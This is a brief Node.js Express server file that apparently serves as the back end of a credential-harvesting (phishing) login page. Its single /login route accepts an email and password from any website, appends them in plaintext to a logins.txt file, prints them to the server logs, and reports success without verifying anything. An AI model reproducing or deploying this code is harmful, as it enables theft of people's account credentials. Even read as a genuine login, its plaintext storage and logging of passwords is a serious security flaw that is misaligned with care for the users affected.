const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000; // Use Render's port if available

app.use(cors());
app.use(bodyParser.json());

app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const entry = `Email: ${email}, Password: ${password}\n`;
  fs.appendFile('logins.txt', entry, (err) => {
    if (err) {
      console.error('Error saving data:', err);
      return res.status(500).json({ success: false });
    }
    // Log to Render logs
    console.log(entry);
    res.json({ success: true });
  });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
